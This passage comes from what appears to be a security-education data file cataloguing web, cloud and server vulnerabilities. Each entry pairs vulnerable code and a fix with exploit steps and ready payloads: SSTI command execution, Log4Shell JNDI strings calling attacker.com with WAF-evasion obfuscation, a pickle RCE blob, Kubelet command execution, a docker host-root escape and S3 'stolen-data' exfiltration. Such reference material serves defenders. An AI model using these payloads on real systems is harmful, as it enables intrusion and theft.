        payload: "/api/items?id[]=test",
        description: "Forces array parameters inside standard integer indices to trigger unhandled exceptions revealing engine architectures."
      }
    ]
  },
  {
    id: 'cors-misconfiguration',
    category: 'web-api',
    name: 'CORS Misconfiguration',
    cwe_id: 'CWE-942',
    severity: 'Medium',
    environment: 'API Cross-Origin communication frameworks',
    technical_explanation: 'When an application configures overly permissive Access-Control headers, allowing arbitrary external domains to read sensitive authenticated responses cross-origin.',
    vulnerable_code_snippet: `// VULNERABLE: Exposing credential access under universal wildcards
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Credentials", "true");
  next();
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `Origin: http://evil.com | Access-Control-Allow-Credentials: true`,
    remediation: 'Ensure that if credentials are required, "Access-Control-Allow-Origin" is specifically mapped to a known, whitelisted origin rather than accepting arbitrary wildcard domains.',
    remediation_code_snippet: `// SECURED: Validating dynamic origins against a restricted whitelist of trusted origins
const ALLOWED_ORIGINS = ["https://trusted-app.com", "https://admin.trusted-app.com"];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
  }
  next();
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Intercept outbound HTTP API requests and append a custom header: "Origin: http://attacker.com".',
      'Analyze responses to determine if headers "Access-Control-Allow-Origin: http://attacker.com" and "Access-Control-Allow-Credentials: true" are returned.',
      'If active, leverage standard AJAX scripts on an external domain to steal user profile details and private tokens.'
    ],
    payloads: [
      {
        title: "Dynamic Origin Reflector Hook",
        type: "HTTP Header Mock",
        payload: "GET /api/user-profile HTTP/1.1\\nHost: victim-api.com\\nOrigin: http://malicious.org",
        description: "Queries authorization variables with dynamic Origin headers to check if the server blindly reflects them in Access-Control-Allow-Origin."
      }
    ]
  },
  {
    id: 'prototype-pollution',
    category: 'web-api',
    name: 'Prototype Pollution',
    cwe_id: 'CWE-1321',
    severity: 'High',
    environment: 'Node.js / Client-Side JavaScript execution environments',
    technical_explanation: 'A JavaScript-specific vulnerability occurring when applications unsafely copy properties via recursive object mergers, allowing properties like "__proto__" to modify default global objects.',
    vulnerable_code_snippet: `// VULNERABLE: Recursively merging input objects without filtering Proto property patterns
function merge(target, source) {
  for (let key in source) {
    if (typeof target[key] === 'object' && typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
} // Triggered using source: {"__proto__": {"isAdmin": true}}`,
    vulnerable_code_lang: 'javascript',
    payload_example: `{"__proto__": {"isAdmin": true}}`,
    remediation: 'Create prototype-less objects via Object.create(null), parse items using Map schemas, or freeze prototypes via Object.freeze(Object.prototype).',
    remediation_code_snippet: `// SECURED: Filtering key patterns before merging objects
function safeMerge(target, source) {
  for (let key in source) {
    if (key === '__proto__' || key === 'constructor') {
      continue; // Filter malicious prototype overrides
    }
    // standard safe copying
  }
}`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Identify functions doing recursive object processing (e.g. JSON query parsers, configuration mergers).',
      'Inject payload parameters containing constructor property overrides.',
      'Check if other objects in application memory inherit modified properties, causing state escalation.'
    ],
    payloads: [
      {
        title: "Pollution Via __proto__ Injection",
        type: "JSON Payload",
        payload: "{\\\"__proto__\\\": {\\\"admin_privilege\\\": true}}",
        description: "Fills missing internal authorization flags by polluting global base objects inside Javascript runtimes."
      }
    ]
  },
  {
    id: 'jwt-vulnerabilities',
    category: 'web-api',
    name: 'JWT Vulnerabilities',
    cwe_id: 'CWE-347',
    severity: 'High',
    environment: 'State Session / Token Decoders',
    technical_explanation: 'Flaws such as using weak HMAC keys vulnerable to brute-forcing, accepting the "none" signature algorithm, or skipping token expiration validation.',
    vulnerable_code_snippet: `// VULNERABLE: Blindly decompressing and trusting session claims by supporting 'none' algorithm verification
const jwt = require('jsonwebtoken');

function checkSession(req, res, next) {
  const token = req.headers.authorization;
  // VULNERABLE: Skipping rigorous signature algorithm constraints
  const decoded = jwt.decode(token); 
  req.user = decoded;
  next();
}`,
    vulnerable_code_lang: 'javascript',
    payload_example: `Header: {"alg":"none","typ":"JWT"} | Claims: {"role":"admin"}`,
    remediation: 'Enforce secret key complexity, reject "none" algorithm signatures, and rely exclusively on robust, well-maintained verification libraries.',
    remediation_code_snippet: `// SECURED: Enforcing signature validation against strong public-key/symmetric keys
const jwt = require('jsonwebtoken');

function checkSession(req, res, next) {
  const token = req.headers.authorization;
  try {
    // Explicit verification enforcing target algorithms like HS256 / RS256
    const verified = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
    req.user = verified;
    next();
  } catch(err) {
    res.status(401).send("Invalid Token");
  }
}`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Inspect JSON Web Token headers decoded inside authentication requests.',
      'Attempt to forge permissions by setting application algorithms to "none" or empty arrays.',
      'Check if credentials accept verification tasks using weak, dictionary-crackable signature strings.'
    ],
    payloads: [
      {
        title: "Signature Elimination Method",
        type: "Header Attack",
        payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        description: "Uses standard none algorithmic headers (base64 encoded) to bypass verification blocks on lax encoders."
      }
    ]
  },
  {
    id: 'cloud-iam-permissions',
    category: 'cloud-security',
    name: 'Over-Privileged Cloud IAM Roles',
    cwe_id: 'CWE-732',
    severity: 'High',
    environment: 'AWS / GCP / Azure Cloud Structures',
    technical_explanation: 'Configuring excessively permissive Identity and Access Management (IAM) role policies on cloud instances. If an attacker gains temporary node access, they can access sensitive data buckets or backend key vaults.',
    vulnerable_code_snippet: `// VULNERABLE (AWS IAM Policy): Wildcard access permitting any operation on any bucket resource
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:*"],
      "Resource": ["*"]
    }
  ]
}`,
    vulnerable_code_lang: 'json',
    payload_example: `aws s3 sync s3://company-private-data-lake ./stolen-data`,
    remediation: 'Follow the Principle of Least Privilege. Restrict policy scopes to specific actions and exact resource Amazon Resource Names (ARNs) or Resource IDs.',
    remediation_code_snippet: `// SECURED (AWS IAM Policy): Explicitly scoping actions to a specific bucket path and reading elements only
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::customer-invoices-prod",
        "arn:aws:s3:::customer-invoices-prod/*"
      ]
    }
  ]
}`,
    remediation_code_lang: 'json',
    exploit_steps: [
      'Hijack an application server running in a cloud platform (e.g. through SSRF or RCE).',
      'Query the local instance metadata endpoint to extract temporary IAM credentials.',
      'Utilize cloud tools (e.g. AWS CLI) to list all administrative permissions on S3 buckets or serverless networks.'
    ],
    payloads: [
      {
        title: "All-Permissive Bucket Exfiltration",
        type: "Cloud CLI",
        payload: "aws s3api list-buckets --query \"Buckets[].Name\"",
        description: "Launches mass lists of unsegmented data endpoints from instances populated with wildcard administrative roles."
      }
    ]
  },
  {
    id: 'container-breakout',
    category: 'cloud-security',
    name: 'Container Escape / Privilege Escalation',
    cwe_id: 'CWE-250',
    severity: 'Critical',
    environment: 'Kubernetes / Docker Clusters',
    technical_explanation: 'Exploiting misconfigurations (such as running containers in privilege modes or mounting base host sockets like docker.sock) to breakout of isolation bounds, gaining control over the host operating system.',
    vulnerable_code_snippet: `# VULNERABLE: Mounting host engine configurations direct inside docker container runtime parameters
docker run -d --name vulnerable-cluster -v /var/run/docker.sock:/var/run/docker.sock --privileged custom-tomcat-image`,
    vulnerable_code_lang: 'bash',
    payload_example: `docker run -it --privileged -v /:/host alpine sh`,
    remediation: 'Never mount the docker socket inside templates, prohibit privileged container runs, and enforce strict Kubernetes security policies.',
    remediation_code_snippet: `# SECURED: Running containers in standard unprivileged modes with read-only root directories
docker run -d --name secure-cluster --read-only --cap-drop=all custom-tomcat-image`,
    remediation_code_lang: 'bash',
    exploit_steps: [
      'Compromise low-level container instances via application code execution.',
      'Check if high-privilege conditions exist or socket configurations reside inside system lists (/var/run/docker.sock).',
      'Connect back to socket to launch high-privilege shell containers mapping server host roots directly.'
    ],
    payloads: [
      {
        title: "Socket Daemon Escape Harness",
        type: "Container CLI",
        payload: "docker run -v /:/media/host -it alpine chroot /media/host",
        description: "Gains complete local host root shell administration by invoking custom docker runs inside systems exposing docker.sock."
      }
    ]
  },
  {
    id: 'ssti',
    category: 'web-api',
    name: 'Server-Side Template Injection (SSTI)',
    cwe_id: 'CWE-1336',
    severity: 'High',
    environment: 'Web Frameworks (Jinja2, Twig, Thymeleaf, Freemarker)',
    technical_explanation: 'Attacker injects template expressions as user input, which are evaluated on the server. If template-rendering libraries parse user inputs directly as templates (rather than variable values), attackers can execute local languages, import os commands, and achieve RCE.',
    vulnerable_code_snippet: `# VULNERABLE (Flask/Jinja2): Compiling structural template variables from dynamic user query inputs
from flask import Flask, render_template_string, request
app = Flask(__name__)

@app.route("/greet")
def greet():
    user = request.args.get('user', 'guest')
    # Directly rendering user inputs as Jinja template entities:
    return render_template_string(f"Hello, {user}!")`,
    vulnerable_code_lang: 'python',
    payload_example: `{{ self.__class__.__mro__[2].__subclasses__() }}`,
    remediation: 'Never concatenate dynamic parameters inside template wrappers. Always pass data into template systems as distinct variable dictionaries, and use restricted engines that run within safe sandboxes.',
    remediation_code_snippet: `# SECURED: Utilizing predefined variable parameters to construct documents securely
from flask import Flask, render_template_string, request
app = Flask(__name__)

@app.route("/greet")
def greet():
    user = request.args.get('user', 'guest')
    # Safe rendering passing variable references:
    return render_template_string("Hello, {{ name }}!", name=user)`,
    remediation_code_lang: 'python',
    exploit_steps: [
      'Identify rendering inputs that reflect numerical or mathematical expressions (e.g. testing with "{{ 7*7 }}").',
      'Observe whether the application returns evaluated responses (e.g. "49") or literal text.',
      'Craft nested object model payloads to access language namespaces, loaders, or system shells.'
    ],
    payloads: [
      {
        title: "Jinja2 Base Class System Execution",
        type: "Jinja2",
        payload: "{{ self.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0] }}",
        description: "Navigates Python's Method Resolution Order (MRO) to find systemic subprocess modules to execute commands."
      },
      {
        title: "Twig File System Exposure",
        type: "Twig (PHP)",
        payload: "{{['/etc/passwd']|map('file_get_contents')|join}}",
        description: "Executes basic PHP file reading functions by mapping them onto twig list variables."
      },
      {
        title: "Expression Language Math Verifier",
        type: "Generic Test",
        payload: "*{7*7}",
        description: "Tests Thymeleaf XML parser evaluation routines using structural markup characters."
      }
    ]
  },
  {
    id: 'nosqli',
    category: 'web-api',
    name: 'NoSQL Injection',
    cwe_id: 'CWE-943',
    severity: 'High',
    environment: 'NoSQL Databases (MongoDB, Redis, CouchDB)',
    technical_explanation: 'Attacker passes structured objects (rather than primitive values) into NoSQL query parsers. In systems built with JavaScript or PHP, unvalidated properties can match comparison operator keys (like "$ne" or "$gt") to completely bypass login blocks or leak databases records.',
    vulnerable_code_snippet: `// VULNERABLE: Direct assignment of query object variables into MongoDB search checks
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // VULNERABLE: If user sends username={ "$ne": "admin" } it alters query intentions
  const user = await db.collection('users').findOne({ username, password });
  res.json(user);
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `{"username": {"$ne": null}, "password": {"$ne": null}}`,
    remediation: 'Sanitize query inputs or typecast variables strictly to primitives (strings or numbers). Avoid passing raw request structures into database query objects.',
    remediation_code_snippet: `// SECURED: Enforcing strict primitive variable conversion on all inbound inputs
app.post('/api/login', async (req, res) => {
  // Convert explicit parameter attributes to strings
  const username = String(req.body.username);
  const password = String(req.body.password);
  
  const user = await db.collection('users').findOne({ 
    username: username, 
    password: password 
  });
  res.json(user);
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Locate endpoints parsing JSON body parameters.',
      'Submit logical comparison commands like {"$ne": ""} inside inputs.',
      'Analyze responses to see if authentication or records are extracted without valid password values.'
    ],
    payloads: [
      {
        title: "MongoDB Authentication Bypass",
        type: "NoSQL Operator",
        payload: "{\\\"username\\\": {\\\"$gt\\\": \\\"\\\"}, \\\"password\\\": {\\\"$gt\\\": \\\"\\\"}}",
        description: "Injects greater-than ($gt) operator queries to bypass identification fields on JSON endpoints."
      },
      {
        title: "Blind NoSQL Character Guessing",
        type: "Regex operator",
        payload: "username[$regex]=^a.*&password[$ne]=1",
        description: "Submits regex triggers ($regex) to incrementally extract credential characters."
      }
    ]
  },
  {
    id: 'graphql-abuse',
    category: 'web-api',
    name: 'GraphQL Introspection & Query Abuse',
    cwe_id: 'CWE-619',
    severity: 'Medium',
    environment: 'GraphQL API Services (Apollo, Yoga, Relay)',
    technical_explanation: 'GraphQL endpoints often leave Introspection queries active in production, allowing attackers to dump the entire API schema. Combined with structural issues like nesting depth loops, attackers can trigger resource exhaustion and locate private queries.',
    vulnerable_code_snippet: `# VULNERABLE: Enabling introspection and dev playgrounds in production API servers
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: true, // Leak schema boundaries
  playground: true
});`,
    vulnerable_code_lang: 'javascript',
    payload_example: `query { __schema { types { name fields { name } } } }`,
    remediation: 'Disable dynamic Schema Introspection in production. Enforce strict pagination, implement Query Depth limiting libraries (such as graphql-depth-limit), and disable dev server playgrounds.',
    remediation_code_snippet: `// SECURED: Disabling endpoints introspection queries and restricting max query complexity
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: false, // Strict secure mode
  validationRules: [depthLimit(5)] // Prohibit deep recursion loops
});`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Query endpoints using default introspection models to list all active schemas.',
      'Create deeply nested recursive scripts (e.g. author { posts { author { posts { ... } } } }) to freeze database connections.',
      'Discover undocumented admin variables and execute unauthorized mutations.'
    ],
    payloads: [
      {
        title: "Full Schema Introspection Query",
        type: "GraphQL Schema",
        payload: "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }",
        description: "Extracts all legal endpoints, types, parameters, and mutations from active GraphQL structures."
      },
      {
        title: "Query Depth Exhaustion Loop",
        type: "GraphQL DoS",
        payload: "query { user { friends { friends { friends { friends { name } } } } } }",
        description: "Drains database locks by issuing massive nested entity requests."
      }
    ]
  },
  {
    id: 'request-smuggling',
    category: 'web-api',
    name: 'HTTP Request Smuggling',
    cwe_id: 'CWE-444',
    severity: 'High',
    environment: 'Reverse Proxies / Load Balancers / Origin Servers',
    technical_explanation: 'Occurs when load balancers (proxies) and backends interpret boundary headers (Content-Length vs Transfer-Encoding: chunked) differently. Attackers can packet-craft messages that leave parts in the socket buffer, hijacking subsequent client requests.',
    vulnerable_code_snippet: `# VULNERABLE: Running front-end reverse-proxies alongside legacy backends without request consistency checks
# Front-end matches 'Content-Length', Backend resolves 'Transfer-Encoding' (CL.TE)
# The mismatch permits smuggling a backend request inside a single TCP payload streaming channel.`,
    vulnerable_code_lang: 'text',
    payload_example: `POST / HTTP/1.1\\nHost: vulnerable-app.com\\nContent-Length: 49\\nTransfer-Encoding: chunked\\n\\n0\\n\\nGET /smuggled HTTP/1.1\\nHost: ...`,
    remediation: 'Disable request/stream-reuse properties where possible, configure proxies to reject non-standard/folded headers, and transition backend connections entirely to HTTP/2.',
    remediation_code_snippet: `# SECURED (Nginx): Permitting strict HTTP/2 protocol and disabling ambiguous Transfer-Encoding values
server {
    listen 443 ssl http2;
    # Force single stream mappings and strict HTTP compliance checks
    client_max_body_size 1M;
}`,
    remediation_code_lang: 'text',
    exploit_steps: [
      'Locate proxies that forward folded HTTP headers without parsing validation.',
      'Send dual-header requests matching both Transfer-Encoding and Content-Length.',
      'Observe if secondary client sessions are forced into receiving attacker-smuggled responses.'
    ],
    payloads: [
      {
        title: "CL.TE Request Injection Hook",
        type: "HTTP Splitting",
        payload: "POST / HTTP/1.1\r\nHost: target.com\r\nConnection: keep-alive\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
        description: "Smugglable setup where the proxy forwards 6 bytes, leaving 'G' in the backend stream to prefix the next request."
      }
    ]
  },
  {
    id: 'dependency-confusion',
    category: 'cloud-security',
    name: 'Dependency Confusion',
    cwe_id: 'CWE-494',
    severity: 'Critical',
    environment: 'CI/CD Pipelines / Package Managers (npm, PyPI, Nuget)',
    technical_explanation: 'Package managers often search local registries and public web repos concurrently. If an company uses a private scope name without reserving it on the public repository, an attacker can publish a higher version of the package publicly, forcing CI/CD builders to download the malicious asset.',
    vulnerable_code_snippet: `// VULNERABLE (package.json): Referencing untrusted, private internal scopes without strict registry lock files
{
  "name": "corporate-analytics-platform",
  "dependencies": {
    "private-corp-auth-module": "^1.0.0" 
    // If attacker occupies "private-corp-auth-module" ver 99.0.0 on npmjs.org, builder pulls public module instead
  }
}`,
    vulnerable_code_lang: 'json',
    payload_example: `npm publish private-corp-auth-module --version 99.0.0`,
    remediation: 'Always run package installations using strict checksum-verified dependency lockfiles (package-lock.json). Configure scopes with scoped registries, and reserve internal names on public registries.',
    remediation_code_snippet: `// SECURED: Explicitly mapping company scopes to local URLs using an .npmrc registry override
@company-scope:registry=https://internal-artifactory.corp/api/npm/
# Enforce strict frozen locks during construction runs:
# npm ci --all`,
    remediation_code_lang: 'text',
    exploit_steps: [
      'Parse corporate assets or bundle files to extract private import script naming references.',
      'Upload an elevated mock package containing dynamic node post-install triggers onto public registries.',
      'Monitor telemetry outputs as build engines fetch the package and run installation binaries.'
    ],
    payloads: [
      {
        title: "Private Scope Namespace Capture",
        type: "Config Bypass",
        payload: "package.json dependency entry: \"@internal-corp/core-lib\": \"^99.9.9\"",
        description: "Exploits standard package search rankings by registering missing corporate scopes with highly elevated version indicators."
      }
    ]
  },
  {
    id: 'log4shell',
    category: 'server-os',
    name: 'Log4Shell (Apache Log4j RCE)',
    cwe_id: 'CWE-502',
    severity: 'Critical',
    environment: 'Enterprise Java Host Services / Middleware',
    technical_explanation: 'Apache Log4j versions < 2.15 resolved nested JNDI directives within logged strings. Attackers could send strings containing dynamic references (like ${jndi:ldap://attacker.com/a}), forcing the server to query remote servers, serialize Java bytecode blocks, and execute instructions.',
    vulnerable_code_snippet: `// VULNERABLE: Logging dirty user inputs via unprotected Log4j managers
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LogController {
    private static final Logger logger = LogManager.getLogger(LogController.class);
    
    public void processRequest(String userAgentString) {
        // Logging unescaped parameters triggers Log4j nested JNDI lookup engine
        logger.error("Request rejected from header: " + userAgentString);
    }
}`,
    vulnerable_code_lang: 'java',
    payload_example: `\${jndi:ldap://attacker-domain.xyz/a}`,
    remediation: 'Keep log4j packages updated to versions >= 2.17. Disable JNDI lookups inside server properties by setting "log4j2.formatMsgNoLookups=true" inside runtime flags.',
    remediation_code_snippet: `// SECURED: Standard upgrade properties enforcing message formats without external Lookups
// Or configure Java system starting variables to completely disable variable checks:
// java -Dlog4j2.formatMsgNoLookups=true -jar enterprise-app.jar`,
    remediation_code_lang: 'java',
    exploit_steps: [
      'Locate fields logged on backend interfaces (e.g., User-Agent headers, Usernames).',
      'Inject JNDI query expressions targeting custom remote listeners.',
      'Analyze connections to determine if the server makes LDAP or RMI queries back to your infrastructure.'
    ],
    payloads: [
      {
        title: "Standard LDAP JDNI String Lookup",
        type: "JNDI Vector",
        payload: "${jndi:ldap://127.0.0.1:1389/ExploitObject}",
        description: "Queries remote directory listeners to download external compiled class payload files."
      },
      {
        title: "Bypassing Simple WAF RegEx Triggers",
        type: "Obfuscation",
        payload: "${jndi:${lower:l}${lower:d}ap://attacker.com/a}",
        description: "Bypasses signature-based firewalls using nested variable formatting tags."
      }
    ]
  },
  {
    id: 'oauth-redirect',
    category: 'web-api',
    name: 'OAuth Redirect URI Hijacking',
    cwe_id: 'CWE-601',
    severity: 'High',
    environment: 'OAuth SSO Platforms / APIs',
    technical_explanation: 'OAuth setups let users authenticate using social accounts (Google, Facebook, GitHub, etc.). If the target OAuth provider permits partial matching or wildcard parameters inside registration redirects, attackers can craft custom authorizations paths that force login codes to leak cross-site.',
    vulnerable_code_snippet: `// VULNERABLE: Direct substring checking on specified Redirect URL schemes
function authorizeUser(req, res) {
  const redirectUri = req.query.redirect_uri;
  // VULNERABLE matching logic: checking only if url contains company hostname
  if (redirectUri.indexOf('authorized-company.com') !== -1) {
    res.redirect(\`https://oauth-provider.com/login?callback=\${redirectUri}\`);
  }
}`,
    vulnerable_code_lang: 'javascript',
    payload_example: `/oauth/authorize?redirect_uri=https://authorized-company.com.attacker.com/cb`,
    remediation: 'Always register strict, exact-match Redirect URIs at the OAuth Provider level. Verify that state parameters pass dynamic cryptographically random nonces, preventing replay attacks.',
    remediation_code_snippet: `// SECURED: Validating Callback URLs strictly using exact matching equality tests
const REGISTERED_CALLBACKS = ["https://authorized-company.com/oauth/callback"];

function authorizeUser(req, res) {
  const redirectUri = req.query.redirect_uri;
  
  if (!REGISTERED_CALLBACKS.includes(redirectUri)) {
    return res.status(400).send("Unauthorized OAuth Redirect URI");
  }
  // Safe redirect processing
}`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Inspect application authorization pathways to identify dynamic "redirect_uri" variables.',
      'Alter callback targets to subdomains or external domains (e.g., company.com.evil.com).',
      'If the authorization completes, harvest authentication secrets and access tokens.'
    ],
    payloads: [
      {
        title: "Host Subdomain Parameter Override",
        type: "OAuth Redirection",
        payload: "/oauth/authorize?client_id=123&redirect_uri=https://company-partner.com&state=rnd",
        description: "Bypasses loose URI checks by exploiting differences in origin path rules."
      }
    ]
  },
  {
    id: 'python-pickle-rce',
    category: 'server-os',
    name: 'Python Deserialization RCE (Pickle)',
    cwe_id: 'CWE-502',
    severity: 'Critical',
    environment: 'Backend Python application runtimes',
    technical_explanation: 'Python\'s standard "pickle" library serializes objects by compiling an instruction set. During unpickling (unserialization), the library executes code commands to rebuild these models. If backend systems load untrusted pickles directly, attackers can forge custom bytecode objects that execute terminal controls during instantiations.',
    vulnerable_code_snippet: `# VULNERABLE: Decoding base64 data and loading it inside Pickle unserializers
import pickle
import base64

def process_cookie_session(cookie_data):
    # DANGEROUS: deserializes user structures without isolation
    session_data = pickle.loads(base64.b64decode(cookie_data))
    return session_data`,
    vulnerable_code_lang: 'python',
    payload_example: `cos\\nsystem\\n(S'whoami'\\ntR.`,
    remediation: 'Never use Pickle for storing session states or data exchanged with untrusted clients. Prefer safe serializers like json, msgpack, or yaml.safe_load.',
    remediation_code_snippet: `# SECURED: Standardized data-only exchange formats preventing script execution
import json

def process_cookie_session(cookie_data):
    # Standard format containing only primitives:
    session_data = json.loads(cookie_data)
    return session_data`,
    remediation_code_lang: 'python',
    exploit_steps: [
      'Locate base64 strings containing Python pickled outputs.',
      'Implement classes featuring "__reduce__" methods (which specify the executable command blocks for Pickle) to instantiate subprocess operations.',
      'Unpickle the base64 output inside target requests, achieving shell-level command executions on the python host.'
    ],
    payloads: [
      {
        title: "Pickle __reduce__ Command Execution",
        type: "Pickle Python",
        payload: "gASVTAAAAAAAAACMBXN5c3RlbZSMAndob2FtaZSFlFKULg==",
        description: "A base64 encoded Pickle payload that outputs the response of 'whoami' via system calls when unpickled."
      }
    ]
  },
  {
    id: 'kubelet-api',
    category: 'cloud-security',
    name: 'Kubelet API Server Misconfiguration',
    cwe_id: 'CWE-306',
    severity: 'Critical',
    environment: 'Kubernetes Nodes / Container Platforms',
    technical_explanation: 'The Kubelet, which resides on each Kubernetes node to manage containers, typically listens on port 10250. If unauthenticated requests are permitted on this API, attackers can query endpoints, list logs, and execute arbitrary commands directly within active pods.',
    vulnerable_code_snippet: `# VULNERABLE: Permitting anonymous credentials in Kubelet configurations
# kubelet-config.yaml settings:
authentication:
  anonymous:
    enabled: true # Allowing unauthenticated API executions
authorization:
  mode: AlwaysAllow # Missing access control checks`,
    vulnerable_code_lang: 'yaml',
    payload_example: `curl -k https://target-node-ip:10250/pods`,
    remediation: 'Disable anonymous access in Kubelet configurations. Enforce Webhook authn/authz checks on port 10250, and ensure all communication is strictly restricted to secure API servers.',
    remediation_code_snippet: `# SECURED: Enforcing strict webhook controls and disabling anonymous credentials
# kubelet-config.yaml safe settings:
authentication:
  anonymous:
    enabled: false # Strictly disabled authentication bypasses
authorization:
  mode: Webhook # Require webhook authorization tokens`,
    remediation_code_lang: 'yaml',
    exploit_steps: [
      'Scan internal networks to map port 10250 bounds (Kubelet service).',
      'Fetch dynamic container listings on unauthenticated paths (e.g. "/pods").',
      'Execute terminal operations directly inside active pods via POST /run requests.'
    ],
    payloads: [
      {
        title: "Kubelet Pod Listing Crawl",
        type: "Cloud Reconnaissance",
        payload: "curl -k -s https://[Kubelet-IP]:10250/pods | grep -i namespace",
        description: "Harvests running container listings and names namespaces using raw unauthenticated TCP channels."
      },
      {
        title: "Command Execution inside Host Pod",
        type: "Cloud Exploitation",
        payload: "curl -k -X POST \"https://[Kubelet-IP]:10250/run/[namespace]/[pod]/[container]?cmd=id\"",
        description: "Executes commands in active containers by communicating directly with vulnerable node managers."
      }
    ]
  },
  {
    id: 'subdomain-takeover',
    category: 'cloud-security',
    name: 'DNS Subdomain Takeover',
    cwe_id: 'CWE-350',
    severity: 'High',
    environment: 'Cloud Host / DNS Namespaces',
    technical_explanation: 'Occurs when a DNS pointing record (CNAME) references an external cloud provider workspace (e.g. GitHub Pages, AWS S3, Heroku) that is subsequently deleted or unclaimed. Attackers can register their own instance under the same name on the cloud provider, claiming complete control over the subdomain.',
    vulnerable_code_snippet: `# VULNERABLE: DNS records pointing to defunct cloud buckets
# active CNAME listing:
# blog.target-corporate.com  CNAME  unclaimed-bucket-901.s3-website-us-east-1.amazonaws.com
# If 'unclaimed-bucket-901' was deleted, an attacker can register a bucket with this exact name and hijack the domain.`,
    vulnerable_code_lang: 'text',
    payload_example: `Registering deleted/defunct bucket names or workspace URLs at cloud providers`,
    remediation: 'Periodically sweep active DNS records to prune dangling CNAME pointers. Implement automated provisioning audits to remove records immediately after removing cloud instances.',
    remediation_code_snippet: `# SECURED: Safe DNS configuration with pruned records
# Ensure dynamic hosting CNAME targets are kept in sync with actual active cloud assets
# Use Route53 Alias records instead of standard text-based strings where possible`,
    remediation_code_lang: 'text',
    exploit_steps: [
      'Scan domain DNS configurations using reconnaissance command searchers (e.g. dig, dnscan).',
      'Look for CNAME records pointing to standard SaaS hosting services (e.g., Shopify, AWS, Heroku) that return 404/defunct status screens.',
      'Register your own workspace matching the unclaimed naming pattern, hijacking traffic on the subdomain.'
    ],
    payloads: [
      {
        title: "Defunct Heroku Reclamation Verification",
        type: "Domain Claim",
        payload: "Host blog.target.com CNAME pointing to dynamicHerokuInstance.herokuapp.com (which returns Heroku 404 screens)",
        description: "Gains page controls on corporate portals by generating heroku workspaces that map back to active canonical DNS names."
      }
    ]
  },
  {
    id: 'race-condition',
    category: 'server-os',
    name: 'Race Condition (TOCTOU)',
    cwe_id: 'CWE-367',
    severity: 'Medium',
    environment: 'Host Filesystems / Multi-threaded Server Applications',
    technical_explanation: 'An application performs state check evaluations sequentially. If a gap exists between the Time-of-Check (TOC) and the Time-of-Use (TOU), a concurrent thread can alter system parameters, forcing applications to process files or execute database adjustments they shouldn\'t.',
    vulnerable_code_snippet: `// VULNERABLE: Thread checking file existence checks in a separate line from read/write executions
const fs = require('fs');

function secureWrite(filePath, payload) {
  // Time of Check (TOC)
  if (fs.existsSync(filePath)) {
    // If attacker links this file to symlinks concurrently before write is triggered:
    // Time of Use (TOU)
    fs.appendFileSync(filePath, payload);
  }
}`,
    vulnerable_code_lang: 'javascript',
    payload_example: `Simultaneous automated execution threads mimicking race limits`,
    remediation: 'Use atomic system operations or locking primitives (such as fd-based actions fs.open/fs.write or transaction locks in SQL databases). Ensure all operations run within isolated, multi-threaded safe managers.',
    remediation_code_snippet: `// SECURED: Atomic operations utilizing solid file-descriptor permissions
const fs = require('fs');

function secureWrite(filePath, payload) {
  // Using atomic write modes with explicit creation flags ('wx' fails if file exists):
  const fd = fs.openSync(filePath, 'wx');
  fs.writeSync(fd, payload);
  fs.closeSync(fd);
}`,
    remediation_code_lang: 'javascript',
    exploit_steps: [
      'Identify multi-step logic checks (e.g. verifying user balances before performing transfer orders).',
      'Create high-frequency multi-threaded query processes to trigger simultaneous state operations (e.g., /transfer request loops).',
      'Exploit thread execution loops to bypass standard balance validations and double-spend resources.'
    ],
    payloads: [
      {
        title: "Multi-threaded Concurrent Request Loop",
        type: "Race Condition",
        payload: "seq 1 100 | xargs -I {} -P 50 curl -X POST -d \"amount=10\" https://target-bank.com/withdraw",
        description: "Launches 100 withdrawal transactions in parallel using 50 threads to exploit validation delays on backend balances."
      }
    ]
  },
  {
    id: 'password-reset-poisoning',
    category: 'web-api',
    name: 'Password Reset Poisoning (Host Header Injection)',
    cwe_id: 'CWE-640',
    severity: 'High',
    environment: 'Authentication Services / Account Recovery Systems',
    technical_explanation: 'The password reset flow generates dynamic links utilizing elements of the HTTP Host header. If Host validations or strict allowlists are absent, an attacker can supply an arbitrary target host header (e.g., evil.com) in their token request. The system then embeds the attacker domain inside the reset email, tricking users into clicking and leaking credentials back to malicious receivers.',
    vulnerable_code_snippet: `// VULNERABLE: Extracting and interpolating the Host header directly in reset URLs
app.post('/api/request-password-reset', async (req, res) => {
  const { email } = req.body;
  const user = await User.findOne({ email });
  if (!user) return res.status(404).send('User not found');
  
  const token = generateSecureToken();
  user.resetToken = token;
  await user.save();
  
  // DANGEROUS: Dynamic host header used to write canonical reset URLs
  const resetLink = \`https://\${req.headers.host}/reset-password?token=\${token}\`;
  await sendResetEmail(email, resetLink);
  res.send('Reset instructions dispatched.');
